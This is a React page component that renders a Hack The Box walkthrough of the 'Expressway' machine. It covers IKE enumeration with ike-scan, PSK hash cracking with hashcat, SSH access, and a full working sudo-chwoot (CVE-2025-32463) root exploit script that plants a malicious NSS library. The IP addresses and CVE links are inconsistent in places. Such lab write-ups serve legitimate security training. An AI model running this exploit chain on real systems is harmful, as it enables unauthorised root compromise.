import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './ExpresswayWalkthrough.css';

const ExpresswayWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  const writeup = {
    id: 'expressway-walkthrough',
    title: 'Expressway Walkthrough',
    excerpt: 'Expressway is an easy-difficulty Linux machine that demonstrates enumeration and exploitation of the IKE service, a component of the IPsec framework. Upon leaking the Pre-Shared Key of the service and cracking it, the retrieved clear-text credentials are used to access the target via SSH. For privilege escalation, CVE-2025-32463 is exploited to get a privileged shell as the root user.',
    date: 'Mar 07, 2026',
    tags: ['Ike', 'Htb', 'Linux', 'Ipsec', 'Sudo_chwoot'],
    difficulty: 'Easy',
    os: 'Linux',
    ip: '10.129.172.229',
    content: `## Overview
Expressway is an **easy**-difficulty Linux machine from **Hack The Box** that demonstrates enumeration and exploitation of the **IKE** service, a component of the IPsec VPN framework. Running \`ike-scan\` against the target leaks a **Pre-Shared Key hash**, which is cracked offline with \`hashcat\` to recover clear-text credentials. Those credentials are then used to log into the machine via **SSH** and capture the user flag. For privilege escalation, two \`sudo\` binaries are found with the SUID bit set, one of which runs a vulnerable version susceptible to [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32462) (sudo-chwoot), allowing a root shell.

## Enumeration
### Port Scanning
TCP port scanning reveals **port 22** open on the target.
\`\`\`bash
sudo nmap -vv -sS -sV -sC -Pn -p- 10.129.172.229 -oN nmap/nmap.log

Discovered open port 22/tcp on 10.129.172.229
\`\`\`

UDP scanning on port 500 reveals an **IKE/ISAKMP** service with XAUTH and Dead Peer Detection attributes, a strong indicator of an IPsec VPN endpoint.
\`\`\`bash
sudo nmap -vv -sU -p500 -sV -sC --min-rate=10000 10.129.172.229

PORT    STATE SERVICE REASON       VERSION
500/udp open  isakmp? udp-response
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
\`\`\`

Some important open ports are discovered:
• **TCP Port 22**: OpenSSH
• **UDP Port 500**: IKE/ISAKMP — IPsec VPN endpoint with XAUTH and Dead Peer Detection

## Foothold
### IKE Enumeration
Running \`ike-scan\` in aggressive mode against port 500 enumerates the IKE service and reveals the username **ike**.
\`\`\`
ike-scan -M -A 10.129.172.155
\`\`\`
![ike-scan user enumeration](/images/writeups/expressway/1.png)

### Retrieving the IKE Hash
With the \`-P\` flag, \`ike-scan\` forces the server to respond with its **Pre-Shared Key hash**, which can then be cracked offline.
\`\`\`
ike-scan -A -M -P 10.129.172.155
\`\`\`
![ike-scan hash retrieval](/images/writeups/expressway/2.png)

### Cracking the Hash
The captured hash is cracked with \`hashcat\` against the rockyou wordlist, recovering the clear-text password.
\`\`\`bash
hashcat hash /usr/share/wordlists/rockyou.txt
\`\`\`
![hashcat cracking the hash](/images/writeups/expressway/3.png)

### User Flag
Authenticating via SSH with the recovered credentials for the **ike** user and retrieving the user flag.
\`\`\`
ssh ike@10.129.172.155
\`\`\`
![SSH login and user flag](/images/writeups/expressway/4.png)

## Post Exploitation
### Privilege Escalation
Searching for binaries with the **SUID** bit set reveals two \`sudo\` binaries on the system.
\`\`\`bash
find / -type f -perm -04000 -ls 2>/dev/null
\`\`\`
![SUID binaries found](/images/writeups/expressway/5.png)

Checking the version of each binary shows that \`/usr/local/bin/sudo\` runs **sudo 1.9.17**, while \`/usr/bin/sudo\` runs an older version.
\`\`\`
/usr/local/bin/sudo --version
/usr/bin/sudo --version
\`\`\`
![sudo versions](/images/writeups/expressway/6.png)

The **sudo 1.9.17** version is vulnerable to [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32462) (sudo-chwoot), a privilege escalation exploit that abuses the \`-R\` flag to chroot into a crafted directory containing a malicious NSS shared library, which executes as root.
\`\`\`bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd \${STAGE?} || exit 1
CMD="/bin/bash"
cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "\${CMD}", NULL);
}
EOF
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
echo "woot!"
sudo -R woot woot
rm -rf \${STAGE?}
\`\`\`

### Root Flag
Executing the exploit script escalates privileges to **root** and allows retrieving the root flag.
\`\`\`
bash sudo.sh
\`\`\`
![Root shell and root flag](/images/writeups/expressway/7.png)

## Conclusion
Expressway is an easy Linux machine that demonstrates the dangers of exposing IKE/IPsec services with weak Pre-Shared Keys and the risk of running vulnerable sudo versions.

The attack path involved:

• **Recon**: TCP scan revealed SSH on port 22; UDP scan on port 500 revealed an IKE/ISAKMP service with XAUTH
• **Enumeration**: \`ike-scan\` in aggressive mode identified the username **ike** and leaked the PSK hash
• **Foothold**: Cracking the PSK hash with \`hashcat\` and \`rockyou.txt\` recovered clear-text credentials, used to SSH in and capture the user flag
• **Privilege Escalation**: Discovering two SUID \`sudo\` binaries, identifying \`sudo 1.9.17\` as vulnerable to [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32462), and exploiting sudo-chwoot to obtain a root shell and capture the root flag

**Tools Used**: Nmap, ike-scan, hashcat, SSH, find, sudo-chwoot (CVE-2025-32463)`
  };

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/expressway/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/expressway/machine.png" alt="Expressway" className="machine-image" />
          </div>
        </div>
      </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default ExpresswayWalkthrough;
